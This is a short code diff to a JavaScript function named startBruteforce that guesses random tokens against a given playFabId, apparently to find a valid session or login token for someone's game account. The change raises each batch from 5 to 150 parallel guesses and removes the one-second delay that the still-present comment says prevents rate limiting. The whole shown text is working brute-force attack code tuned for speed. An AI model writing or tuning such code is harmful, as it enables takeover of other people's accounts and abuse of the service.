@@ -1539,7 +1539,7 @@ async function startBruteforce() {
   async function tryTokenBatch() {
     if (!bruteforceRunning) return;
 
-    const batchSize = 5;
+    const batchSize = 150;
     const tokens = Array.from({ length: batchSize }, generateRandomToken);
     const results = await Promise.all(tokens.map(token => checkToken(playFabId, token)));
 
@@ -1563,7 +1563,7 @@ async function startBruteforce() {
     }
 
     if (!foundValid && bruteforceRunning) {
-      setTimeout(tryTokenBatch, 1000); // Delay to prevent rate limiting
+      setTimeout(tryTokenBatch, 0); // Delay to prevent rate limiting
     } else if (foundValid) {
       stopBruteforce();
     }
